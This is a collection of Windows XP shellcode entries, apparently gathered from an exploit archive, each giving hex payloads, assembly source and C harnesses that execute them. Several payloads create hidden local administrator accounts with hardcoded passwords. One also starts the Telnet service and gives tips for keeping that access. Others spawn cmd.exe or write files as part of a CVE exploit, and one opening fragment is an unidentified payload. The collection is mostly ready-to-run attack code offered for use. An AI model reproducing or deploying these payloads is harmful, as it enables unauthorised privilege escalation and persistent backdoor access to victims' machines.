"\xd0\xdc\x4b\x71\xe0\x12\x3e\x97\xd1\x42\xd8\x57\xd6\x92\x43"
"\xa9\x5c\x9c\x0d\x8e\x83\xd3\x70\xc2\x4c\x13\x73\x1b\xc4\xf6"
"\x9b\x43\x29\x07\xa4\xfd\x17\x1c\xb9\xa0\x1a\x9f\x3a\xd4\xd4"
"\xde\x82\xee\x16\xe0\x04\x07\xa0\x1f\xfb\x28\x26\xd1\x5f\xe6"
"\x79\xbd\x0c\xf7\x2f\x39\x82\xc7\x80\xbe\xb1\xcf\xc8\xad\xc5"
"\x2f\xf7\x4e\x57\xb4\x26\xf5\xdf\x51\x17\xda\x7c\xba\x39\x41"
"\xf7\x9a\xb0\xfa\x92\xa8\x1a\x8f\x39\x2e\x2e\x06\xa6\x80\xf0"
"\xb5\x16\x8f\x9b\x65\x78\x2e\x38\x01\xa6\x96\xe6\xe9\xc8\xb3"
"\x92\xc9\x78\x53\x38\x68\xed\xcc\xcc\x05\x98\x62\x11\xb8\x06"
"\xee\x38\x54\xae\x83\xce\xda\x51\x10\x40\x68\xe1\xf8\xed\xe9"
"\x66\x8c\x78\x95\x58\x4e\x54\x34\xfd\xea\xaa";
 
int main(int argc, char **argv)
{
    ((void (*)())code)();
    printf("New local admin \tUsername: secuid0\n\t\t\tPassword: m0nk");
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title: win32/xp pro sp3 (EN) 32-bit - add new local administrator 113 bytes
Author: Anastasios Monachos (secuid0) - anastasiosm[at]gmail[dot]com
Method: Hardcoded opcodes (kernel32.winexec@7c8623ad, kernel32.exitprocess@7c81cafa)
Tested on: WinXP Pro SP3 (EN) 32bit - Build 2600.080413-2111
Greetz: offsec and inj3ct0r teams
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
char code[] =   "\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23"
                "\x86\x7c\xff\xd3\x31\xc0\x50\xbb\xfa\xca"
                "\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63"
                "\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20"
                "\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x73"
                "\x65\x63\x75\x69\x64\x30\x20\x6d\x30\x6e"
                "\x6b\x20\x2f\x61\x64\x64\x20\x26\x26\x20"
                "\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67"
                "\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e"
                "\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20"
                "\x73\x65\x63\x75\x69\x64\x30\x20\x2f\x61"
                "\x64\x64\x00";
 
int main(int argc, char **argv)
{
    ((void (*)())code)();
    printf("New local admin \tUsername: secuid0\n\t\t\tPassword: m0nk");
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#name: win xp sp2 PEB ISbeingdebugged shellcode
#Author: Anonymous
#Date: 14.12.2009.
here is the ASM code made using masm32
if program is being run under debugger the shellcode wil start beeping :D
//////////////////////begin///////////////////////////////////////
.386
.model flat, stdcall
option casemap :none
INCLUDE  C:\MASM32\INCLUDE\WINDOWS.INC
INCLUDE  C:\MASM32\INCLUDE\KERNEL32.INC
INCLUDE  C:\MASM32\INCLUDE\USER32.INC
INCLUDE  C:\MASM32\INCLUDE\MASM32.INC
INCLUDELIB  C:\MASM32\LIB\KERNEL32.LIB
INCLUDELIB  C:\MASM32\LIB\USER32.LIB
INCLUDELIB  C:\MASM32\LIB\MASM32.LIB
    .data
ExitMsg  DB "Enter to Exit", 0
  .code
 start:
assume fs:nothing
mov eax,fs:[30h]
mov     eax, [eax+02h]
mov ebx, 7FFF8000h
add ebx,7FFF8000h
inc ebx
push 300h
push 200h
mov edx,7c837a8fh
cmp eax,ebx
jnz exit
call edx
exit:
invoke ExitProcess,NULL
end start
/////////////////////////////end///////////////////////////////
here is the dump of code using olly debugger
00401000 >/$ 64:A1 30000000 MOV EAX,DWORD PTR FS:[30]
00401006  |. 8B40 02        MOV EAX,DWORD PTR DS:[EAX+2]
00401009  |. BB 0080FF7F    MOV EBX,7FFF8000
0040100E  |. 81C3 0080FF7F  ADD EBX,7FFF8000
00401014  |. 43             INC EBX
00401015  |. 68 00030000    PUSH 300                                 ; /Duration = 768. ms
0040101A  |. 68 00020000    PUSH 200                                 ; |Frequency = 200 (512.)
0040101F  |. BA 8F7A837C    MOV EDX,kernel32.Beep                    ; |
00401024  |. 3BC3           CMP EAX,EBX                              ; |
00401026  |. 75 02          JNZ SHORT antidebu.0040102A              ; |
00401028  |. FFD2           CALL EDX                                 ; \Beep
0040102A  |> 6A 00          PUSH 0                                   ; /ExitCode = 0
0040102C  \. E8 01000000    CALL <JMP.&kernel32.ExitProcess>         ; \ExitProcess
00401031     CC             INT3
00401032   .-FF25 00204000  JMP DWORD PTR DS:[<&kernel32.ExitProcess>;  kernel32.ExitProcess
here is the shellcode
\x64\xA1\x30\x00\x00\x00\x8B\x40\x02\xBB\x00\x80\xFF\x7F\x81\xC3\x00\x80\xFF\x7F\x43\x68\x00\x03\x00\x00\x68\x00\x02\x00\x00\xBA\x8F\x7A\x83\x7C\x3B\xC3\x75\x02\xFF\xD2\x6A\x00\xE8\x01\x00\x00\x00\xCC\xFF\x25\x00\x20\x40\x00



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

+-----------------------------------------------------+
| Windows XP Pro Sp2 English "Message-Box" Shellcode. |
+-----------------------------------------------------+

Size         : 16 Bytes, Null-Free.
Author       : Aodrulez. 
Email        : f3arm3d3ar@gmail.com


Shellcode = "\xB9\x38\xDD\x82\x7C\x33\xC0\xBB"
            "\xD8\x0A\x86\x7C\x51\x50\xFF\xd3";


+--------------+
| Description: |
+--------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I've used a Function called "FatalAppExit".
The Benefits are Three-Fold!

1] Displays a MessageBox.
2] Terminates the Process. 
3] Its there in Kernel32.dll itself.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+-----------+
| Asm Code: |
+-----------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

shellcode:
 	      mov ecx,7c82dd38h ;"Admin" string in mem
 	      xor eax,eax
 	      mov ebx,7c860ad8h ;Addr of "FatalAppExit()" 
 		push ecx          ;function from Kernel32
 		push eax          
 		call ebx          ;App does a Clean Exit.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-----------------+
| Shellcodetest.c |
+-----------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

char code[] = "\xB9\x38\xDD\x82\x7C\x33\xC0\xBB"
              "\xD8\x0A\x86\x7C\x51\x50\xFF\xd3";


int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-------------------+
| Greetz Fly Out To |
+-------------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1] Amforked()	 : My Mentor.
2] The Blue Genius : My Boss.
3] www.orchidseven.com
4] str0ke

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+---------------------------------------------+
| Forgive, O Lord, My Little Jokes on Thee,   |
| and I'll Forgive Thy Great Big Joke on Me.  |
+---------------------------------------------+




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

+-------------------------------------------------+

| Windows XP Pro Sp2 English "Wordpad" Shellcode. |

+-------------------------------------------------+


Size  : 15 Bytes.
Author: Aodrulez. 
Email : f3arm3d3ar@gmail.com


Shellcode = "\x6A\x05\x68\x97\x4C\x80\x7C\xB8"
            "\x4D\x11\x86\x7C\xFF\xD0\xCC";


+-----------+

| Asm Code: |

+-----------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

start:
      push 5
	push 7c804c97h    ;addr of "write" string in mem
	mov eax,7c86114dh ;addr of "WinExec" Function.
	call eax
	int 3h
end start

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-----------------+

| Shellcodetest.c |

+-----------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

char code[] = "\x6A\x05\x68\x97\x4C"
              "\x80\x7C\xB8\x4D\x11"
              "\x86\x7C\xFF\xD0\xCC";


int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+-------------------+

| Greetz Fly Out To |

+-------------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1] Amforked()	 : My Mentor.
2] The Blue Genius : My Boss.
3] www.orchidseven.com
4] www.isacm.org.in

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     






////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; Write-to-file Shellcode
;
; This shellcode was used in the exploit for: CVE-2010-0425
; Supported: Windows 2000, WinXP, Server 2003, Server 2008, Vista, Windows 7
;
; Size: 278 bytes
; ////////////////////////////////////////////////////////////////////////////////
; \x31\xc0\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x56\x08\x8b\x7e\x20
; \x8b\x36\x66\x39\x4f\x14\x75\xf2\x66\xb9\x01\x6d\x66\x81\xe9\x94\x6c\x66\x39\x0f
; \x66\x89\xc1\x75\xe1\x89\xe5\xeb\x71\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05
; \x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31
; \xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28
; \x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01
; \xe8\x89\x44\x24\x1c\x61\xc3\xad\x50\x52\xe8\xaa\xff\xff\xff\x89\x07\x66\x81\xc4
; \x0c\x01\x66\x81\xec\x04\x01\x66\x81\xc7\x08\x01\x66\x81\xef\x04\x01\x39\xce\x75
; \xde\xc3\xeb\x10\x5e\x8d\x7d\x04\x89\xf1\x80\xc1\x0c\xe8\xcd\xff\xff\xff\xeb\x3b
; \xe8\xeb\xff\xff\xff\x6e\x7c\x2e\xe1\x1e\x3c\x3f\xd7\x74\x1e\x48\xcd\x31\xd2\x58
; \x88\x50\x05\xeb\x2d\x31\xd2\x59\x88\x51\x01\xeb\x2c\x51\x50\xff\x55\x04\xeb\x2a
; \x31\xd2\x59\x88\x51\x05\xeb\x2d\x51\x50\x89\xc6\xff\x55\x08\x53\xff\x55\x0c\xe8
; \xd1\xff\xff\xff\x66\x2e\x74\x78\x74\x4e\xe8\xce\xff\xff\xff\x77\x4e\xe8\xcf\xff
; \xff\xff\xe8\xd1\xff\xff\xff\x70\x77\x6e\x65\x64\x4e\xe8\xce\xff\xff\xff
; ////////////////////////////////////////////////////////////////////////////////
;
; Origin: http://www.senseofsecurity.com.au
; Written by Brett Gervasoni (brettg [at] senseofsecurity.com.au)
;
; By default the shellcode will write "pwned" to a text file titled "f.txt" in
; the current working directory.
;
; Editable parameters:
; Line 228: Filename
;           Be sure to update the length on line 185
; Line 232: Access mode
;           Be sure to update the length on line 193
; Line 239: Data (text to be written)
;           Be sure to update the length on line 208
 
[SECTION .text]
global _start
 
_start:
    ; if it matters what is on the stack, then allocate space - otherwise, who cares we are exiting anyway?
    ; save bytes by not including it...
    ;sub esp, 0x0c ; allocate space on the stack for funct addresses
     
; ======================= Find the base address of msvcrt.dll =======================
    ; By checking if a entry in the InInitializationOrder list has a null byte in position
    ; 20 we can find the base addr of msvcrt.dll on Windows 7 and Vista.
    ; "msvcrt.dll" is equal to 10 bytes, so in unicode, its 20 bytes long.
    ; kernel32.dll can be found in a similar fashion. "kernel32.dll" is 12 bytes long though.
    ; on WinXP the InInitializationOrder list is as follows: ntdll.dll, kernel32.dll, msvcrt.dll
    ; On Windows Server 2003, msvcrt.dll is in position 5 and before this dll is checked, RPCRT4.dll
    ; is checked. Which matches the length of msvcrt.dll, as a result the base address of RPCRT4.dll
    ; is used. Obviously this is no good. To solve this problem i made the shellcode check for the
    ; presents of 'm' in position 0 as well .
    xor eax, eax           ; make sure it is 0
    xor ecx, ecx           ; ECX = 0
    mov esi, [fs:ecx+0x30] ; ESI = &(PEB) ([FS:0x30])
    mov esi, [esi+0x0c]    ; ESI = PEB->Ldr
    mov esi, [esi+0x1c]    ; ESI = PEB->Ldr.InInitOrder
NextModule:
    mov edx, [esi+0x08]    ; EDX = InInitOrder[X].base_address
    mov edi, [esi+0x20]    ; EDX = InInitOrder[X].module_name (unicode)
    mov esi, [esi]         ; ESI = InInitOrder[X].flink (next module)
    cmp [edi+10*2], cx     ; modulename[12] == 0 ?
    jne NextModule         ; No: try next module.
     
    ; extra check to find msvcrt.dll
    mov cx, 0x6d01         ; m = 0x6d
    sub cx, 0x6c94
                           ; result is 0x6d (m)
    cmp [edi], cx          ; modulename[0] == m ?
    mov cx, ax
    jne NextModule
 
    ; base address of msvcrt.dll is now in edx
    ; update ebp
    mov ebp, esp
 
    jmp short GetHashesSpring ; using a spring to avoid null bytes
 
; ======================= FUNCTIONS =======================
; Export Directory Table method
find_function:
    pushad
    mov ebp, [esp + 0x24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
compute_hash:
    xor edi, edi
    xor eax, eax
    cld
compute_hash_again:
    lodsb
    test al, al
    jz compute_hash_finished
    ror edi, 0xd
    add edi, eax
    jmp short compute_hash_again
compute_hash_finished:
find_function_compare:
    cmp edi, [esp + 0x28]
    jnz find_function_loop
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 0x1c]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    mov [esp + 0x1c], eax
find_function_finished:
    popad
    ret
 
ResolveSymbolsForDLL:
    lodsd
    push eax                    ; push hashes for find_function
    push edx
    call find_function
    mov [edi], eax              ; save found function address
    ;add sp, 0x08
    add sp, 0x10c ; + 268
    sub sp, 0x104 ; - 260 = 8
    ;add di, 0x04               ; increment edi by 4 (due to function address being saved)
    add di, 0x108 ; + 264
    sub di, 0x104 ; - 260 = 4
    cmp esi, ecx                ; check if esi meets length of hash list
    jne ResolveSymbolsForDLL
ResolveSymbolsForDLLComplete:
    ret
 
; ====================== / FUNCTIONS ======================
 
GetHashesSpring:
    jmp short GetHashes ; using a spring to avoid null bytes
 
HashesReturn:
    pop esi
    lea edi, [ebp + 0x04]
    mov ecx, esi
    add cl, 0x0c              ; length of function hash list
 
    call ResolveSymbolsForDLL
 
    jmp short GetFilename
     
GetHashes:
    call HashesReturn
     
    ; msvcrt.dll hash list
    ; fopen hash = 0x6E7C2EE1
    db 0x6E
    db 0x7C
    db 0x2E
    db 0xE1
 
    ; fprintf hash = 0x1E3C3FD7
    db 0x1E
    db 0x3C
    db 0x3F
    db 0xD7
    ; since the message is small, no need to worry about closing the file
    ; keep the shellcode smaller that way.
     
    ; exit hash = 0x741E48CD
    db 0x74
    db 0x1E
    db 0x48
    db 0xCD
 
GetFilenameReturn:
    xor edx, edx ; zero out a reg for nulls
 
    pop eax ; f.txt
    mov [eax+5], dl ; insert a null byte, 'f.txt'
     
    jmp short GetFileMode
 
GetFileModeReturn:
    xor edx, edx ; zero out a reg for nulls
 
    pop ecx ; w
    mov [ecx+1], dl ; insert a null byte, 'w'
 
    jmp short GetfopenCall ; Now jump to fopen call
     
fopenCall: 
    push ecx ; 'w'
    push eax ; push 'f.txt'
    call [ebp+4]; call fopen
     
    jmp short GetfprintfData
 
GetfprintfDataReturn:
    xor edx, edx ; zero out a reg for a null
 
    pop ecx ; push data string
    mov [ecx+5], dl ; insert a null byte
     
    jmp short GetfprintfCall
 
fprintfCall:   
    push ecx ; data
    push eax ; handle
     
    mov esi, eax ; we want to keep the handle for close
     
    call [ebp+8] ; call fprintf
 
; It needs to either exit, or call fclose to write the buffer to file.
ExitProcessCall:
    push ebx ; ebx has 00004000 in it - who cares what we give exit?
 
    call [ebp+0x0c] ; exit
 
GetFilename:
    call GetFilenameReturn
    db 'f.txtN' ; filename
 
GetFileMode:
    call GetFileModeReturn
    db 'wN' ; file access mode
 
GetfopenCall:
    call fopenCall
 
GetfprintfData:
    call GetfprintfDataReturn
    db 'pwnedN' ; data to be written to file
 
GetfprintfCall:
    call fprintfCall



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; payload:add admin acount & Telnet Listening
; Author: DATA_SNIPER
; size:111 bytes
; platform:WIN32/XP SP2 FR
; thanks:Arab4services team & AT4RE Team
; more info: visit my blog http://datasniper.arab4services.net
; The Sh3llcode:
; "\xEB\x08\xBA\x4D\x11\x86\x7C\xFF\xD2\xCC\xE8\xF3\xFF\xFF\xFF\x63\x6D\x64\x20\x2F\x63"
; "\x20\x6E\x65\x74\x20\x75\x73\x65\x72\x20\x68\x69\x6C\x6C\x20\x31\x32\x33\x34\x35"
; "\x36\x20\x2F\x41\x44\x44\x20\x26\x26\x20\x6E\x65\x74\x20\x6C\x6F\x63\x61\x6C\x67"
; "\x72\x6F\x75\x70\x20\x41\x64\x6D\x69\x6E\x69\x73\x74\x72\x61\x74\x65\x75\x72\x73"
; "\x20\x68\x69\x6C\x6C\x20\x2F\x41\x44\x44\x20\x26\x26\x20\x73\x63\x20\x73\x74\x61"
; "\x72\x74\x20\x54\x6C\x6E\x74\x53\x76\x72\x00"
; Description: it's simular to TCP BindShell on port 23,throught Command execution we can get shell access throught telnet service on Windows b0x.
; Add admin account command user=GAZZA ,pass=123456 :cmd /c net user GAZZA 123456 /ADD && net localgroup Administrateurs GAZZA /ADD
; Start telnet service: sc start TlntSvr
; For saving ur access to the B0x again and again :),u can use this command:
; "sc config TlntSvr start= auto &  sc start TlntSvr" instead of:
; "sc start TlntSvr"
; NASM -s -fbin telnetbind.asm
BITS 32 
db 0EBh,08h    ;such as "jmp Data" ,i puted it in opcode format for avoiding null problem.
Exec:
MOV EDX,7C86114Dh ;WinExec addr in WIN XP SP2 FR
CALL EDX
INT3 ;just interrupter (hung the shellcode after it do his job,any way u can use ExitProcess) for avoiding infinite loop
Data:
CALL Exec
db 'cmd /c net user GAZZA 123456 /ADD & net localgroup Administrateurs GAZZA /ADD & sc start TlntSvr',00h
;add user GAZA with 123456 password and start telnet service ;BTW the exstension cuted for saving som byte ;)




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
\ win32 useradd shellcode for russian systems
/ by Darkeagle
\ ExploiterZ Lab
/ http://exploiterz.org
\
*/

// add user "slim" with password "shady" with admin prem. in Russian Systems
unsigned char data[318] = {
	0xEB, 0x0F, 0x58, 0x80, 0x30, 0x17, 0x40, 0x81, 0x38, 0x6D, 0x61, 0x7A, 0x61, 0x75, 0xF4, 0xEB,
	0x05, 0xE8, 0xEC, 0xFF, 0xFF, 0xFF, 0xFE, 0xB6, 0x17, 0x17, 0x17, 0x4A, 0x42, 0x26, 0xCC, 0x73,
	0x9C, 0x14, 0x57, 0x84, 0x9C, 0x54, 0xE8, 0x57, 0x62, 0xEE, 0x9C, 0x44, 0x14, 0x71, 0x26, 0xC5,
	0x71, 0xAF, 0x17, 0x07, 0x71, 0x96, 0x2D, 0x5A, 0x4D, 0x63, 0x13, 0x3E, 0xD5, 0xFC, 0xE2, 0x9E,
	0xC4, 0x9C, 0x6D, 0x2B, 0x16, 0xC0, 0x14, 0x48, 0x6F, 0x9C, 0x5C, 0x0F, 0x9C, 0x64, 0x37, 0x9C,
	0x6C, 0x33, 0x16, 0xC1, 0x16, 0xC0, 0xEB, 0xBA, 0x16, 0xC7, 0x81, 0x90, 0xEA, 0x46, 0x26, 0xDE,
	0x97, 0xD6, 0x18, 0xE4, 0xB1, 0x65, 0x1D, 0x81, 0x4E, 0x90, 0xEA, 0x63, 0x18, 0x50, 0x50, 0xF5,
	0xF1, 0xA9, 0x18, 0x17, 0x17, 0x17, 0x3E, 0xD9, 0x3E, 0xE0, 0xFC, 0xFC, 0x26, 0xD7, 0x71, 0x9C,
	0x10, 0xD6, 0xF7, 0x15, 0x9C, 0x64, 0x0B, 0x16, 0xC1, 0x16, 0xD1, 0xBA, 0x16, 0xC7, 0x9E, 0xD1,
	0x9E, 0xC0, 0x4A, 0x9A, 0x92, 0x0B, 0x17, 0x17, 0x17, 0x47, 0x40, 0xE8, 0xC1, 0x7F, 0x12, 0x17,
	0x17, 0x17, 0x9A, 0x9A, 0x27, 0x17, 0x17, 0x17, 0x46, 0xE8, 0xC7, 0x9A, 0x92, 0x33, 0x17, 0x17,
	0x17, 0x47, 0x40, 0xE8, 0xC1, 0x7F, 0x17, 0x17, 0x17, 0x17, 0xE8, 0xC7, 0xFF, 0x4D, 0xE8, 0xE8,
	0xE8, 0x50, 0x72, 0x63, 0x47, 0x65, 0x78, 0x74, 0x56, 0x73, 0x73, 0x65, 0x72, 0x64, 0x64, 0x17,
	0x5B, 0x78, 0x76, 0x73, 0x5B, 0x7E, 0x75, 0x65, 0x76, 0x65, 0x6E, 0x56, 0x17, 0x40, 0x7E, 0x79,
	0x52, 0x6F, 0x72, 0x74, 0x17, 0x52, 0x6F, 0x7E, 0x63, 0x47, 0x65, 0x78, 0x74, 0x72, 0x64, 0x64,
	0x17, 0x74, 0x7A, 0x73, 0x37, 0x38, 0x74, 0x37, 0x79, 0x72, 0x63, 0x37, 0x62, 0x64, 0x72, 0x65,
	0x37, 0x38, 0x76, 0x73, 0x73, 0x37, 0x64, 0x7B, 0x7E, 0x7A, 0x37, 0x64, 0x7F, 0x76, 0x73, 0x6E,
	0x31, 0x31, 0x79, 0x72, 0x63, 0x37, 0x7B, 0x78, 0x74, 0x76, 0x7B, 0x70, 0x65, 0x78, 0x62, 0x67,
	0x37, 0x38, 0x76, 0x73, 0x73, 0x37, 0xF7, 0xF3, 0xFB, 0xFF, 0xFA, 0xFF, 0xE6, 0xE5, 0xE7, 0xF7,
	0xE5, 0xF9, 0xE7, 0xEC, 0x37, 0x64, 0x7B, 0x7E, 0x7A, 0x17, 0x6D, 0x61, 0x7A, 0x61
};

int main()
{

   void (*c0d3)();
   printf("Win32 \"adduser shellcode\"\n");
   *(int*)&c0d3 = data;
   c0d3();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
Title: Windows XP SP3 English MessageBoxA Shellcode (87 bytes)
Date: August 20, 2010
Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
Tested on: Windows XP SP3 En
Thanks: ishtus
Greetz: Astalavista, OffSEC, Exploit-DB
*/

#include <stdio.h>

char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\x51\x68\x6c\x6c\x20\x20\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72"
"\x89\xe1\xbb\x7b\x1d\x80\x7c\x51" // 0x7c801d7b ; LoadLibraryA(user32.dll)
"\xff\xd3\xb9\x5e\x67\x30\xef\x81"
"\xc1\x11\x11\x11\x11\x51\x68\x61"
"\x67\x65\x42\x68\x4d\x65\x73\x73"
"\x89\xe1\x51\x50\xbb\x40\xae\x80" // 0x7c80ae40 ; GetProcAddress(user32.dll, MessageBoxA)
"\x7c\xff\xd3\x89\xe1\x31\xd2\x52"
"\x51\x51\x52\xff\xd0\x31\xc0\x50"
"\xb8\x12\xcb\x81\x7c\xff\xd0";    // 0x7c81cb12 ; ExitProcess(0)

int main(int argc, char **argv)
{
   int (*func)();
   func = (int (*)()) shellcode;
   printf("Shellcode Length is : %d",strlen(shellcode));
   (int)(*func)();
   




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * Windows Xp Home edition SP2 english ( calc.exe ) 37 bytes shellcode
 * by: Hazem mofeed Aka Hakxer
 * penetration testing labs
 *   www.pentestlabs.com
 */
 
char evil[] =
"\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x8d\x15\x86\x7c\xff\xd3\x31\xc0"
"\x50\xbb\xea\xcd\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";
 
int main(int argc, char **argv)
{
int (*shellcode)();
shellcode = (int (*)()) evil;
(int)(*shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
* Windows Xp Home edition SP3 english ( calc.exe ) 37 bytes shellcode
* by: Hazem mofeed
* The Shellcode: http://www.exploit-db.com/exploits/11598
* Modified to working In SP3,
* Home: www.pentestlabs.com
* greetz: ProViDoR , ExH , rUnVirUs , Sinaritx , Data_fr34k3r , Br1ght D@rk
*/
 
char evil[] =
"\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0"
"\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";
 
int main(int argc, char **argv)
{
int (*shellcode)();
shellcode = (int (*)()) evil;
(int)(*shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 
26 Bytes Win32 Shellcode (cmd.exe) for XP SP2 Turkish
 
Author: Hellcode Research || TCC (The Computer Cheats)
http://tcc.hellcode.net
memberz: celil 'karak0rsan unuver , murderkey,  murat kaslioglu, bob
 
from murderkey: I love you merve lol     
from karak0rsan: fuck u "ysmn" lol || eternal love kubr4 ||
notebookumu calan hirsiz kurcalarsa l33t h4x0r olabilir ahahaha :]
merak etme mkey, en kisa zamanda giden 0dayleri tekrar toplucam ;]
 
 
Greetz: AhmetBSD aka L4M3R, GOBBLES and all blackhat community
 
"\xc7\x93\xc1\x77" is the system address. (0x77c193c7)
You can change it if you use another XP. (e.g SP2 FR, SP3 Turkish etc.)
(Open MSVCRT.DLL via Dependency Walker,
find system function's address and MSVCRT's Preferred Base address
system + preferred base = System Address ;] )
 
 
*/
 
 
#include <windows.h>
#include <winbase.h>
 
 
unsigned char hellcodenet[]=
"\x8b\xec\x55\x8b\xec"
"\x68\x65\x78\x65\x2F"
"\x68\x63\x6d\x64\x2e"
"\x8d\x45\xf8\x50\xb8"
"\xc7\x93\xc1\x77"
"\xff\xd0"
;
 
int main ()
{
int *ret;
ret=(int *)&ret+2;
(*ret)=(int)hellcodenet;
return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 
26 Bytes Win32 Shellcode (cmd.exe) for XP SP3 English
Author: Hellcode Research || TCC (The Computer Cheats)
http://tcc.hellcode.net
memberz: celil 'karak0rsan unuver , murderkey,  murat kaslioglu, bob
 
from murderkey: I love you merve lol     
from karak0rsan: fuck u "ysmn" lol || eternal love kubr4 ||
notebookumu calan hirsiz kurcalarsa l33t h4x0r olabilir ahahaha :]
merak etme mkey, en kisa zamanda giden 0dayleri tekrar toplucam ;]
 
Greetz: AhmetBSD aka L4M3R, GOBBLES and all blackhat community
 
"\xc7\x93\xc2\x77" is the system address. (0x77c293c7)
You can change it if you use another XP. (e.g SP2 FR, SP3 Turkish etc.)
(Open MSVCRT.DLL via Dependency Walker,
find system function's address and MSVCRT's Preferred Base address
system + preferred base = System Address ;] )
 
*/
 
#include <windows.h>
#include <winbase.h>
 
 
unsigned char hellcodenet[]=
"\x8b\xec\x55\x8b\xec"
"\x68\x65\x78\x65\x2F"
"\x68\x63\x6d\x64\x2e"
"\x8d\x45\xf8\x50\xb8"
"\xc7\x93\xc2\x77"
"\xff\xd0"
;
 
int main ()
{
int *ret;
ret=(int *)&ret+2;
(*ret)=(int)hellcodenet;
return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*------------------------------------------------------------------------
  Title...................Windows XP SP3 EN Calc Shellcode 16 Bytes
  Release Date............12/7/2010
  Tested On...............Windows XP SP3 EN
  ------------------------------------------------------------------------
  Author..................John Leitch
  Site....................http://www.johnleitch.net/
  Email...................john.leitch5@gmail.com
  ------------------------------------------------------------------------*/

int main(int argc, char *argv[])
{
    char shellcode[] =         
        "\x31\xC9"                // xor ecx,ecx        
        "\x51"                    // push ecx        
        "\x68\x63\x61\x6C\x63"    // push 0x636c6163        
        "\x54"                    // push dword ptr esp        
        "\xB8\xC7\x93\xC2\x77"    // mov eax,0x77c293c7        
        "\xFF\xD0";               // call eax         
 
    ((void(*)())shellcode)();
 
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

